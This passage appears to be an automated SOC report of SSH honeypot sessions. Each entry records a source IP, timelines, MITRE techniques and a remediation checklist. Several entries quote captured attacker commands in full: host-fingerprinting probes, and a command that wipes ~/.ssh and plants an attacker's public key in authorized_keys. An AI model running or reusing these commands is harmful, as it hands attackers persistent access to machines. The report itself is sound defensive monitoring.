| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-25 14:59 |
| **Last Seen** | 2026-09-25 14:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:59:47` | `cowrie.session.connect` |
| `2026-09-25 14:59:47` | `cowrie.client.version` |
| `2026-09-25 14:59:47` | `cowrie.client.kex` |
| `2026-09-25 14:59:47` | `cowrie.login.success` |
| `2026-09-25 14:59:51` | `cowrie.direct-tcpip.request` |
| `2026-09-25 14:59:52` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 14:59:52` | `cowrie.direct-tcpip.data` |
| `2026-09-25 14:59:52` | `cowrie.direct-tcpip.request` |
| `2026-09-25 14:59:54` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 14:59:54` | `cowrie.direct-tcpip.data` |
| `2026-09-25 14:59:54` | `cowrie.direct-tcpip.request` |
| `2026-09-25 14:59:54` | `cowrie.direct-tcpip.ja4` |
| `2026-09-25 14:59:54` | `cowrie.direct-tcpip.data` |
| `2026-09-25 14:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3d4ba328972

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 14:59 |
| **Last Seen** | 2026-09-25 15:00 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 14:59:47` | `cowrie.session.connect` |
| `2026-09-25 14:59:49` | `cowrie.client.version` |
| `2026-09-25 14:59:49` | `cowrie.client.kex` |
| `2026-09-25 14:59:59` | `cowrie.login.success` |
| `2026-09-25 15:00:03` | `cowrie.session.params` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.command.success` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.command.input` |
| `2026-09-25 15:00:03` | `cowrie.log.closed` |
| `2026-09-25 15:00:06` | `cowrie.session.params` |
| `2026-09-25 15:00:06` | `cowrie.command.input` |
| `2026-09-25 15:00:08` | `cowrie.log.closed` |
| `2026-09-25 15:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a73e8c3ff2c7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 15:02 |
| **Last Seen** | 2026-09-25 15:02 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:02:13` | `cowrie.session.connect` |
| `2026-09-25 15:02:17` | `cowrie.client.version` |
| `2026-09-25 15:02:17` | `cowrie.client.kex` |
| `2026-09-25 15:02:28` | `cowrie.login.success` |
| `2026-09-25 15:02:31` | `cowrie.session.params` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.command.success` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.command.input` |
| `2026-09-25 15:02:31` | `cowrie.log.closed` |
| `2026-09-25 15:02:39` | `cowrie.session.params` |
| `2026-09-25 15:02:39` | `cowrie.command.input` |
| `2026-09-25 15:02:42` | `cowrie.log.closed` |
| `2026-09-25 15:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0e0cbfe7b4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 15:04 |
| **Last Seen** | 2026-09-25 15:04 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:04:25` | `cowrie.session.connect` |
| `2026-09-25 15:04:28` | `cowrie.client.version` |
| `2026-09-25 15:04:28` | `cowrie.client.kex` |
| `2026-09-25 15:04:42` | `cowrie.login.success` |
| `2026-09-25 15:04:44` | `cowrie.session.params` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:44` | `cowrie.command.success` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:44` | `cowrie.command.input` |
| `2026-09-25 15:04:45` | `cowrie.log.closed` |
| `2026-09-25 15:04:52` | `cowrie.session.params` |
| `2026-09-25 15:04:52` | `cowrie.command.input` |
| `2026-09-25 15:04:54` | `cowrie.log.closed` |
| `2026-09-25 15:04:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-676916a1f76b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 15:06 |
| **Last Seen** | 2026-09-25 15:06 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:06:33` | `cowrie.session.connect` |
| `2026-09-25 15:06:37` | `cowrie.client.version` |
| `2026-09-25 15:06:37` | `cowrie.client.kex` |
| `2026-09-25 15:06:51` | `cowrie.login.success` |
| `2026-09-25 15:06:53` | `cowrie.session.params` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:53` | `cowrie.command.success` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:53` | `cowrie.command.input` |
| `2026-09-25 15:06:54` | `cowrie.log.closed` |
| `2026-09-25 15:06:55` | `cowrie.session.params` |
| `2026-09-25 15:06:55` | `cowrie.command.input` |
| `2026-09-25 15:06:55` | `cowrie.log.closed` |
| `2026-09-25 15:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37366aa44398

| Field | Detail |
|---|---|
| **Source IP** | `95.85.226[.]199` |
| **First Seen** | 2026-09-25 15:07 |
| **Last Seen** | 2026-09-25 15:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:07:21` | `cowrie.session.connect` |
| `2026-09-25 15:07:21` | `cowrie.client.version` |
| `2026-09-25 15:07:21` | `cowrie.client.kex` |
| `2026-09-25 15:07:21` | `cowrie.login.success` |
| `2026-09-25 15:07:22` | `cowrie.session.params` |
| `2026-09-25 15:07:22` | `cowrie.command.input` |
| `2026-09-25 15:07:22` | `cowrie.command.failed` |
| `2026-09-25 15:07:22` | `cowrie.log.closed` |
| `2026-09-25 15:07:23` | `cowrie.session.params` |
| `2026-09-25 15:07:23` | `cowrie.command.input` |
| `2026-09-25 15:07:23` | `cowrie.session.file_download` |
| `2026-09-25 15:07:23` | `cowrie.log.closed` |
| `2026-09-25 15:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.85.226[.]199` to AbuseIPDB if not already reported
- [ ] Block `95.85.226[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98637da733b

| Field | Detail |
|---|---|
| **Source IP** | `95.85.226[.]199` |
| **First Seen** | 2026-09-25 15:07 |
| **Last Seen** | 2026-09-25 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:07:23` | `cowrie.session.connect` |
| `2026-09-25 15:07:23` | `cowrie.client.version` |
| `2026-09-25 15:07:23` | `cowrie.client.kex` |
| `2026-09-25 15:07:24` | `cowrie.login.success` |
| `2026-09-25 15:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.85.226[.]199` to AbuseIPDB if not already reported
- [ ] Block `95.85.226[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-742494fe0810

| Field | Detail |
|---|---|
| **Source IP** | `95.85.226[.]199` |
| **First Seen** | 2026-09-25 15:07 |
| **Last Seen** | 2026-09-25 15:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:07:24` | `cowrie.session.connect` |
| `2026-09-25 15:07:24` | `cowrie.client.version` |
| `2026-09-25 15:07:24` | `cowrie.client.kex` |
| `2026-09-25 15:07:24` | `cowrie.login.success` |
| `2026-09-25 15:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.85.226[.]199` to AbuseIPDB if not already reported
- [ ] Block `95.85.226[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c60f7b03f571

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-09-25 15:07 |
| **Last Seen** | 2026-09-25 15:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:07:24` | `cowrie.session.connect` |
| `2026-09-25 15:07:24` | `cowrie.client.version` |
| `2026-09-25 15:07:24` | `cowrie.client.kex` |
| `2026-09-25 15:07:25` | `cowrie.login.success` |
| `2026-09-25 15:07:26` | `cowrie.session.params` |
| `2026-09-25 15:07:26` | `cowrie.command.input` |
| `2026-09-25 15:07:26` | `cowrie.command.failed` |
| `2026-09-25 15:07:27` | `cowrie.log.closed` |
| `2026-09-25 15:07:27` | `cowrie.session.params` |
| `2026-09-25 15:07:27` | `cowrie.command.input` |
| `2026-09-25 15:07:28` | `cowrie.session.file_download` |
| `2026-09-25 15:07:28` | `cowrie.log.closed` |
| `2026-09-25 15:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1193af7f7ece

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-09-25 15:07 |
| **Last Seen** | 2026-09-25 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:07:28` | `cowrie.session.connect` |
| `2026-09-25 15:07:28` | `cowrie.client.version` |
| `2026-09-25 15:07:28` | `cowrie.client.kex` |
| `2026-09-25 15:07:29` | `cowrie.login.success` |
| `2026-09-25 15:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e91523b9d66

| Field | Detail |
|---|---|
| **Source IP** | `4.221.162[.]168` |
| **First Seen** | 2026-09-25 15:07 |
| **Last Seen** | 2026-09-25 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:07:29` | `cowrie.session.connect` |
| `2026-09-25 15:07:29` | `cowrie.client.version` |
| `2026-09-25 15:07:30` | `cowrie.client.kex` |
| `2026-09-25 15:07:31` | `cowrie.login.success` |
| `2026-09-25 15:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.221.162[.]168` to AbuseIPDB if not already reported
- [ ] Block `4.221.162[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac3987a8df2

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-09-25 15:09 |
| **Last Seen** | 2026-09-25 15:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:09:34` | `cowrie.session.connect` |
| `2026-09-25 15:09:34` | `cowrie.client.version` |
| `2026-09-25 15:09:34` | `cowrie.client.kex` |
| `2026-09-25 15:09:35` | `cowrie.login.success` |
| `2026-09-25 15:09:36` | `cowrie.session.params` |
| `2026-09-25 15:09:36` | `cowrie.command.input` |
| `2026-09-25 15:09:36` | `cowrie.command.failed` |
| `2026-09-25 15:09:36` | `cowrie.log.closed` |
| `2026-09-25 15:09:37` | `cowrie.session.params` |
| `2026-09-25 15:09:37` | `cowrie.command.input` |
| `2026-09-25 15:09:37` | `cowrie.session.file_download` |
| `2026-09-25 15:09:37` | `cowrie.log.closed` |
| `2026-09-25 15:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0acb9db1cb4b

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-09-25 15:09 |
| **Last Seen** | 2026-09-25 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:09:37` | `cowrie.session.connect` |
| `2026-09-25 15:09:37` | `cowrie.client.version` |
| `2026-09-25 15:09:37` | `cowrie.client.kex` |
| `2026-09-25 15:09:38` | `cowrie.login.success` |
| `2026-09-25 15:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7c291a1cfd0

| Field | Detail |
|---|---|
| **Source IP** | `211.105.129[.]57` |
| **First Seen** | 2026-09-25 15:09 |
| **Last Seen** | 2026-09-25 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:09:38` | `cowrie.session.connect` |
| `2026-09-25 15:09:38` | `cowrie.client.version` |
| `2026-09-25 15:09:39` | `cowrie.client.kex` |
| `2026-09-25 15:09:39` | `cowrie.login.success` |
| `2026-09-25 15:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.105.129[.]57` to AbuseIPDB if not already reported
- [ ] Block `211.105.129[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-950caa4aa4c5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 15:10 |
| **Last Seen** | 2026-09-25 15:11 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:10:56` | `cowrie.session.connect` |
| `2026-09-25 15:10:59` | `cowrie.client.version` |
| `2026-09-25 15:10:59` | `cowrie.client.kex` |
| `2026-09-25 15:11:09` | `cowrie.login.success` |
| `2026-09-25 15:11:11` | `cowrie.session.params` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.command.success` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.command.input` |
| `2026-09-25 15:11:11` | `cowrie.log.closed` |
| `2026-09-25 15:11:12` | `cowrie.session.params` |
| `2026-09-25 15:11:12` | `cowrie.command.input` |
| `2026-09-25 15:11:13` | `cowrie.log.closed` |
| `2026-09-25 15:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d755abb943

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-09-25 15:13 |
| **Last Seen** | 2026-09-25 15:13 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-25 15:13:07` | `cowrie.session.connect` |
| `2026-09-25 15:13:09` | `cowrie.client.version` |
| `2026-09-25 15:13:09` | `cowrie.client.kex` |
| `2026-09-25 15:13:20` | `cowrie.login.success` |
| `2026-09-25 15:13:23` | `cowrie.session.params` |
| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.command.input` |
| `2026-09-25 15:13:23` | `cowrie.command.success` |
